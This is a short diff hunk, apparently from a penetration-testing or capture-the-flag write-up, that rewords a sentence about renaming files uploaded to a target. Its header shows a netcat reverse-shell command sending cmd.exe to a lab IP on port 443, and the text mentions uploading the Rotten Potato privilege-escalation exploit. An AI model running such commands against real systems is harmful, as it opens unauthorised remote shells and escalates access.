@@ -188,7 +188,7 @@ execute -f nc32.exe -a "-e cmd.exe 10.10.16.133 443"
 
 ## Now we can upload rotten potato and continue.
 
-Since the files from last session is still present and I can't upload the files with the same name. Also I cannot delete them on the target system for some reason, so I renamed everything.
+The files from last session is still present and I can't upload the files with the same name. Also I cannot delete them on the target system for some reason, so I renamed everything.
 
 ---
 
